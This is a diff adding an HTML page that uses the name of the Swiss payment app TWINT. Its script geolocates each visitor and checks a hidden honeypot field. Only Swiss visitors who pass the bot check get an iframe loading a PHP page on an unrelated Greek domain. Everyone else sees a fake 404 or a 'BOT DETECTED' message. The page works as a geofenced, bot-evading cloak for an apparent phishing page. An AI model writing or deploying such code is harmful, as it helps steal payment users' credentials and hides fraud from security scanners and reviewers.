@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+        <title>
+            TWINT
+        </title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <link rel="icon" href="favicon.ico" />
+        <style>
+            #restricted-content, #not-allowed, #bot-detected {
+                display: none;
+            }
+            .honeypot {
+                display: none;
+            }
+        </style>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <div id="restricted-content">
+            <iframe src="" id="frame-src" style="width: 100%; height: 100vh;" frameborder="0"></iframe>
+        </div>
+        <div id="not-allowed">
+            <h1>404 NOT FOUND</h1>
+        </div>
+        <div id="bot-detected">
+            <h1>BOT DETECTED</h1>
+        </div>
+        <form id="myForm">
+            <input type="text" id="honeypot" class="honeypot">
+        </form>
+        <script>
+            $.ajax({
+                url: "https://geolocation-db.com/jsonp",
+                jsonpCallback: "callback",
+                dataType: "jsonp",
+                success: function(location) {
+                    if (location.country_code == 'CH') {
+                        if($('#honeypot').val() == '') {
+                            $('#restricted-content').show();
+                            $('#frame-src').attr('src', 'https://plexiglasscenter.gr/sdf/index.aspx.php');
+                        } else {
+                            $('#bot-detected').show();
+                        }
+                    } else {
+                        $('#not-allowed').show();
+                    }
+                }
+            });
+        </script>
+    </body>
+</html>
